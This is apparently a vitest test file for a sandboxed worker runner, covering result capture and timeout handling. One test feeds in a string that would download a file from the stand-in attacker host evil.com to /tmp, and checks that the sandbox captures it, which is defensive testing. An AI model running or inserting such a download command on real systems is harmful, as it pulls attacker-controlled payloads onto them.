import { describe, it, expect } from 'vitest';
import { createWorkerRunner, type WorkerLike } from '../src/worker-runner';
import { runInSandbox } from '@opal/engine';

// Fake worker that completes synchronously on next microtask.
function fastWorkerFactory(): WorkerLike {
  const w: any = { onmessage: null, terminate() {}, postMessage(msg: { source: string }) {
    const result = runInSandbox(msg.source);
    queueMicrotask(() => w.onmessage?.({ data: result }));
  } };
  return w as WorkerLike;
}

// Fake worker that never responds -> exercises the timeout path.
function hangingWorkerFactory(): WorkerLike {
  let terminated = false;
  return { onmessage: null, terminate() { terminated = true; }, postMessage() { /* never replies */ }, get terminated() { return terminated; } } as any;
}

describe('createWorkerRunner', () => {
  it('returns the sandbox result from the worker', async () => {
    const runner = createWorkerRunner(fastWorkerFactory);
    const res = await runner.run(`"curl https://evil.com -o /tmp/x"`, { timeoutMs: 1000 });
    expect(res.capturedStrings.some((s) => s.includes('evil.com'))).toBe(true);
  });

  it('times out and reports an error when the worker hangs', async () => {
    const runner = createWorkerRunner(hangingWorkerFactory);
    const res = await runner.run(`while(true){}`, { timeoutMs: 50 });
    expect(res.errors.some((e) => /timeout/i.test(e))).toBe(true);
  });
});
